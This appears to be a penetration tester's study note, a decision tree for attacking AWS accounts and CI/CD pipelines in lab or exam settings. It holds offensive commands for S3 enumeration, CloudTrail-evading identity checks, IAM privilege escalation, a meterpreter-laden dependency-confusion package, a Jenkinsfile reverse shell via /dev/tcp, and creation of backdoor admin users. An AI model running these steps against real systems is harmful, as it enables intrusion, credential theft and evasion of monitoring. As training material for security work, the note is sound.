# Cloud Enumeration — Decision Tree

Part of [[DECISION TREE]]. "I found X, what do I try" lookup for AWS cloud enumeration. For syntax see [[Cloud Enumeration]] (Command Appendix). For phase-ordered workflow see [[Cloud Methodology]].

#AWS #Cloud #IAM #S3 #DecisionTree

---

## I know the target domain and suspect cloud hosting

```
host -t ns <domain>
        │
        ├── awsdns-*.co.uk/net/com/org → Route53 (AWS)
        │       └── host www.<domain> → check IP
        │                   └── host <ip> → ec2-* PTR → confirmed EC2
        │
        ├── azure-dns.com → Azure
        └── ns-cloud-*.googledomains.com → GCP

On Route53 confirmed:
    └── dig TXT <domain> @<dns_ip>
            └── non-standard string in SPF/TXT record → potential flag/data hidden there

    └── dnsenum <domain> --threads 100
            └── zone transfer fails (expected on Route53)
            └── subdomains discovered via brute force → enumerate each

    └── browse www.<domain> → DevTools Network tab
            └── filter s3.amazonaws.com requests
            └── extract bucket name from URL
```

---

## I found an S3 bucket URL

```
curl "https://s3.amazonaws.com/<bucket>/"
        │
        ├── XML listing → OPEN bucket (public read)
        │       └── download all files: aws s3 cp s3://<bucket>/ /tmp/ --recursive
        │
        ├── AccessDenied → bucket exists but private
        │       └── try direct object access anyway (listing ≠ object access)
        │               aws s3 cp s3://<bucket>/proof.txt - 2>/dev/null
        │               └── success → object is public even though bucket listing is blocked
        │
        └── NoSuchBucket → bucket doesn't exist (bad name or wrong region)
                └── try us-west-2, eu-west-1 etc.

Naming convention guessing:
    Known bucket: <org>-assets-public-<suffix>
    └── extract <suffix> from known URL
    └── try: <org>-<keyword>-<suffix> with keyword wordlist (gemstones, projects, envs)
    └── aws s3 cp s3://<org>-${kw}-<suffix>/proof.txt - 2>/dev/null

Automated:
    cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
```

---

## I need to enumerate resources in another AWS account (no creds in target)

```
Do I have a known public resource (AMI/snapshot/S3 bucket) from the target?
        │
        ├── YES: AMI or public snapshot
        │       └── aws ec2 describe-images --executable-users all --filters "Name=name,Values=*<keyword>*"
        │               └── OwnerId = target's account ID
        │
        ├── YES: publicly readable S3 object
        │       └── Use s3:ResourceAccount StringLike oracle (Nick Frichette technique)
        │               → binary-search account ID one digit at a time
        │               → zero traces in target's CloudTrail
        │
        └── I want to enumerate IAM users/roles cross-account
                └── Use IAM trust policy oracle (Pacu iam__enum_roles)
                        pacu → import_keys <attacker_profile>
                        run iam__enum_roles --account-id <target_acct> --word-list /tmp/names.txt
                        MalformedPolicy = doesn't exist
                        Success + credentials = exists AND assumable
```

---

## I have compromised AWS credentials — what first?

```
aws sts get-caller-identity --profile <compromised>
        └── note UserId, Account, Arn (username + path)

Scope permissions:
        aws iam list-user-policies + list-attached-user-policies (direct)
        aws iam list-groups-for-user → list-group-policies per group (inherited)
        │
        ├── Have iam:GetAccountAuthorizationDetails?
        │       └── aws iam get-account-authorization-details --filter User Group LocalManagedPolicy > /tmp/iam.json
        │               └── analyse with jq (see Command Appendix — Cloud Enumeration)
        │
        └── No IAM read? → try EC2 describe actions to find tagged resources
                aws ec2 describe-vpcs --profile <compromised>    → check Tags for proof/flag
                aws ec2 describe-instances --profile <compromised>
                aws ec2 describe-tags --profile <compromised>    → often more restricted

Reduce noise / evade logging:
        aws sts get-access-key-info --access-key-id AKIA...    (logs in YOUR account, not target's)
        Use --region us-east-2 to log events outside the monitored region
        Lambda invoke nonexistent function → identity from error, data event (not default logged)
```

---

## I found a dangerous IAM permission — what can I escalate to?

```
iam:CreateAccessKey on Resource:*
        → CreateAccessKey for any user (including admins)
        → aws iam create-access-key --user-name <admin-user> --profile <compromised>
        → configure new profile with those keys → full admin

iam:CreateLoginProfile / iam:UpdateLoginProfile on Resource:*
        → Set or reset console password for any user
        → aws iam update-login-profile --user-name <admin> --password NewPass1! --no-password-reset-required

iam:AttachUserPolicy on Resource:*
        → Attach AdministratorAccess to yourself
        → aws iam attach-user-policy --user-name <self> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

iam:PutUserPolicy on Resource:*
        → Create inline admin policy on yourself
        → aws iam put-user-policy --user-name <self> --policy-name admin --policy-document '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion
        → Create a new version of an existing managed policy with Action:* Resource:*
        → Set it as default → all users/roles attached to that policy now have admin

iam:PassRole + ec2:RunInstances / lambda:CreateFunction
        → Launch EC2/Lambda with an admin role attached
        → Steal credentials from instance metadata or invoke to escalate

ABAC tag confusion (any iam:* scoped by tag condition):
        → Find a tag-scoped policy: select(.Condition.StringEquals."aws:ResourceTag/Project" != null)
        → Find admin users tagged with that project name
        → If admin user has the project tag → full IAM access to that user (CreateAccessKey etc.)
```

---

## I assumed a role — what can I access?

```
aws sts get-caller-identity --profile <assumed-role-profile>
        └── confirm AssumedRoleUser ARN

aws ec2 describe-vpcs --profile <assumed-role-profile> --no-cli-pager
        └── check Tags array on each VPC for proof/flag keys

aws ec2 describe-instances --profile <assumed-role-profile> --no-cli-pager

aws iam get-account-authorization-details --filter User Group LocalManagedPolicy \
  --profile <assumed-role-profile> > /tmp/iam-as-role.json
        └── may see more than the original credentials could see
        └── look for additional privesc paths from the role's perspective
```

---

## CI/CD Attack Vectors

#CICD #DependencyConfusion #Jenkins #PoisonedPipeline #Terraform

### I see a private package registry (PyPI, npm, RubyGems)

```
OSINT: search forums, issue trackers, job postings for internal package names + versions
        └── found "hackshort_util v1.1.3" → internal package name confirmed

Can you publish to the registry?
    YES → Dependency Chain Abuse (CICD-SEC-3)
        → Build malicious package at version N+1
        → Embed meterpreter in utils.py / index.js / main.rb
        → Publish with twine/npm publish/gem push
        → Wait up to 10-15 min for production rebuild cycle
        → Catch meterpreter session
    NO → Look for package source in SCM (Gitea/GitHub) and poison the source instead
```

### I have a meterpreter session in a container — no nmap

```
Upload netscan.py via meterpreter:
        upload /local/path/netscan.py /netscan.py

Run from shell:
        python3 /netscan.py 172.18.0.1/24
        python3 /netscan.py 172.30.0.1/24
        └── look for :80 (web), :8080 (Jenkins/app), :443

Found :8080 on internal IP?
        └── curl http://172.x.x.x:8080/login → Jenkins login page?
                └── shows "Create an account" → self-registration enabled
                        → Set up SOCKS proxy tunnel → browse internally
                        → Create account → enumerate projects + plugins
```

### I'm browsing Jenkins internally via SOCKS tunnel

```
Check installed plugins (Manage Jenkins → Plugins → Installed):
        └── S3 Explorer?
                → Navigate to a project using it
                → View Page Source (Ctrl+U)
                → Search "awsid" → plaintext AWS keys in hidden inputs
                → Configure stolen-s3 profile → enumerate S3 buckets

Check all project Jenkinsfiles for:
        └── Hardcoded credentials, environment variable refs, secret blocks
        └── Pipeline steps that could be PPE targets

Found a build project you can trigger?
        └── Can you edit the Jenkinsfile? → PPE (Poisoned Pipeline Execution)
        └── Can you push code to the upstream repo? → Indirect PPE
```

### I have S3 credentials — what do I look for?

```
aws s3api list-buckets --profile <stolen>
        └── bucket names with "tf", "terraform", "state" → gold mine

Download terraform.tfstate
        └── grep -A20 '"index_key"' → per-user IAM key blocks
        └── grep "AdministratorAccess" → find the admin user
        └── Extract id + secret → configure new profile → sts get-caller-identity
                → AdministratorAccess confirmed?
                        → ec2 describe-instances → check Tags for flags
                        → iam get-account-authorization-details → full audit
                        → enumerate everything
```

### Container has no sqlite3 binary

```
python3 -c "
import sqlite3
c = sqlite3.connect('<path/to/db.db>')
print([t[0] for t in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")])
print(c.execute('SELECT * FROM <table>').fetchall())
"
```

---

## Scenario 1: Leaked Secrets to Poisoned Pipeline

#PoisonedPipeline #GitLeaks #Jenkins #IAM

### I found an S3 bucket name in the page source

```
curl https://<bucket>.s3.us-east-1.amazonaws.com
    └── AccessDenied → bucket ACL blocks public, but try AWS CLI

aws s3 ls <bucket-name>   (using any valid AWS account)
    └── SUCCESS = AuthenticatedUsers ACL misconfiguration
            → aws s3 sync s3://<bucket> ./local/
            → Check for: .git/ directory, Jenkinsfile, scripts/, source code

Found .git/ directory in the bucket?
    └── git log  →  look for "Fix issue", "Remove creds", "Oops", "WIP"
    └── git show <suspicious_commit>
            → diff shows removed hardcoded Authorization: Basic header?
                    → base64 --decode → username:password
                    → try on SCM server (Gitea, GitHub, GitLab)
```

### I have credentials for the SCM server

```
Browse private repos → look for Jenkinsfile / .gitlab-ci.yml / .github/workflows/
        └── Jenkinsfile found with withAWS(credentials:'aws_key') block?
                → Pipeline loads AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY as env vars
                → Check webhook settings (Settings → Webhooks): Push event → Jenkins URL?

Can you edit the Jenkinsfile?
    YES → Poisoned Pipeline Execution (PPE)
        → Add sh 'bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" &' inside withAWS block
        → Commit → webhook fires → Jenkins builds → reverse shell with AWS env vars
    NO → Can you fork and submit a PR? → Indirect PPE (PR triggers pipeline)
```

### I have a reverse shell on the Jenkins builder

```
env | grep AWS
    └── AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY present?
            → aws configure --profile=CompromisedJenkins with these values
            → sts get-caller-identity → get username

iam list-user-policies + list-attached-user-policies + list-groups-for-user
        └── Any inline policy with Action: "*", Resource: "*"?
                → FULL ADMIN
                → Create backdoor user with AdministratorAccess
                → Create access key for backdoor user
                → ec2 describe-instances → check Tags for flags/assets
```

### I need to check if a container is privileged

```
cat /proc/1/status | grep Cap
        └── CapPrm all F's (0000003fffffffff)?
                → capsh --decode=0000003fffffffff → shows all capabilities
                → cap_sys_admin + cap_net_admin = privileged container
                → but still need root in container to exploit escape

cat /proc/mounts | head -3
        └── overlay on / type overlay = Docker
        └── Look for additional mounts → secrets from host?
```
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for shell troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for transformations
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
